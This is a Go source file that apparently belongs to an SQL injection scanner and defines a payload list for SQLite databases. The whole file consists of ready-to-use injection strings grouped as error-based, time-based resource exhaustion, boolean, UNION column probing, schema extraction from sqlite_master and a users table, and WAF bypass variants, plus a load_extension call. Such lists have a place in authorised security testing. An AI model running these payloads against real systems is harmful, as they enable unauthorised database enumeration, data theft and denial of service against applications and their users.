package payloads

var SQLite = PayloadGroup{
	DBMS: "SQLite",
	Payloads: []Payload{
		// ═══════════════════════════════════════════
		// ERROR-BASED
		// ═══════════════════════════════════════════
		{Type: "error", Content: "' AND 1=sqlite_version()--"},
		{Type: "error", Content: "' AND (SELECT UPPER(HEX(RANDOMBLOB(100000000/2))))--"},
		{Type: "error", Content: "1' AND (SELECT RANDOMBLOB(100000000))--"},
		{Type: "error", Content: "' AND (SELECT LIKELY(1/0))--"},
		{Type: "error", Content: "' AND (SELECT UNLIKELY(1/0))--"},
		{Type: "error", Content: "1' UNION SELECT 1, sqlite_version()--"},
		{Type: "error", Content: "' AND (SELECT 1=1 UNION SELECT load_extension('malicious'))--"},
		{Type: "error", Content: "' AND (SELECT zeroblob(100000000))--"},

		// ═══════════════════════════════════════════
		// TIME-BASED (Heavy Computation)
		// ═══════════════════════════════════════════
		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000/2))))))--"},
		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(200000000/2))))))--"},
		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT ZEROBLOB(100000000)))--"},
		{Type: "time", Content: "' AND (SELECT 1 FROM (SELECT ZEROBLOB(200000000)))--"},
		{Type: "time", Content: "' AND (SELECT RANDOMBLOB(50000000))--"},
		{Type: "time", Content: "' AND (SELECT RANDOMBLOB(100000000))--"},
		{Type: "time", Content: "' AND (SELECT total_changes() FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3))--"},
		{Type: "time", Content: "' AND (SELECT TOTAL(LIKELY(1)) FROM (SELECT 1 UNION SELECT 2 UNION SELECT 3))--"},

		// ═══════════════════════════════════════════
		// BOOLEAN-BASED
		// ═══════════════════════════════════════════
		{Type: "boolean", Content: "' AND (SELECT 1)=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT 1)=2--", Expected: "false"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM sqlite_master)>0--", Expected: "true"},
		{Type: "boolean", Content: "' AND (SELECT COUNT(*) FROM nonexistent_table)>0--", Expected: "false"},
		{Type: "boolean", Content: "' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "1' AND 1=1--", Expected: "true"},
		{Type: "boolean", Content: "1' AND 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' OR 1=1--", Expected: "true"},
		{Type: "boolean", Content: "' OR 1=2--", Expected: "false"},
		{Type: "boolean", Content: "' OR 'a'='a'--", Expected: "true"},
		{Type: "boolean", Content: "' OR 'a'='b'--", Expected: "false"},

		// ═══════════════════════════════════════════
		// UNION-BASED
		// ═══════════════════════════════════════════
		{Type: "union", Content: "' ORDER BY 1--"},
		{Type: "union", Content: "' ORDER BY 2--"},
		{Type: "union", Content: "' ORDER BY 3--"},
		{Type: "union", Content: "' ORDER BY 4--"},
		{Type: "union", Content: "' UNION SELECT NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT NULL,NULL,NULL--"},
		{Type: "union", Content: "' UNION SELECT 1,2,3--"},
		{Type: "union", Content: "' UNION SELECT sqlite_version(),2,3--"},

		// ═══════════════════════════════════════════
		// DATA EXTRACTION (sqlite_master)
		// ═══════════════════════════════════════════
		{Type: "deep", Content: "' UNION SELECT name,NULL FROM sqlite_master WHERE type='table'--"},
		{Type: "deep", Content: "' UNION SELECT sql,NULL FROM sqlite_master WHERE type='table'--"},
		{Type: "deep", Content: "'; PRAGMA table_info('users')--"},
		{Type: "deep", Content: "' UNION SELECT sql,NULL FROM sqlite_master WHERE tbl_name='users' AND type='table'--"},
		{Type: "deep", Content: "' UNION SELECT GROUP_CONCAT(name),NULL FROM sqlite_master WHERE type='table'--"},
		{Type: "deep", Content: "' UNION SELECT GROUP_CONCAT(sql,'||'),NULL FROM sqlite_master WHERE type='table'--"},

		// ═══════════════════════════════════════════
		// WAF BYPASS
		// ═══════════════════════════════════════════
		{Type: "bypass", Content: "' OR 1=1--"},
		{Type: "bypass", Content: "' OR 1=1#"},
		{Type: "bypass", Content: "admin'--"},
		{Type: "bypass", Content: "'/**/OR/**/1=1--"},
		{Type: "bypass", Content: "'%20OR%201=1--"},
	},
}
